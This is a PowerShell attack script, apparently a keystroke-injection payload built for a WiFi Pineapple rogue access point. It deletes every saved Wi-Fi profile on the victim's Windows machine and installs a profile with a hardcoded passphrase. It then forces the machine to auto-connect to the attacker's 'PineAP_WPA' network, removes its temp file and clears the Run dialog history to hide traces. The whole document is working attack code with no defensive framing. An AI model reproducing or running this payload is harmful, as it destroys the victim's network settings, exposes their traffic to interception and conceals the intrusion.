
$savedwlans = (netsh.exe wlan show profiles) -match "    All User Profile     : "
$savedwlans = $savedwlans -replace "    All User Profile     : "

$profilexml="$env:temp\Pineapple.xml"
$SSID="PineAP_WPA"
$PSK="pineapplesareyummy"

ForEach ($savedwlan in $savedwlans){

netsh wlan delete profile name=$savedwlan

}


$SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join''
$xmlfile="<?xml version=""1.0""?>
<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
    <name>$SSID</name>
    <SSIDConfig>
        <SSID>
            <hex>$SSIDHEX</hex>
            <name>$SSID</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$PSK</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"

$XMLFILE > ($profilexml)
netsh wlan add profile filename="$($profilexml)"
netsh wlan show profiles $SSID key=clear
netsh wlan connect name=$SSID

rm $profilexml

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
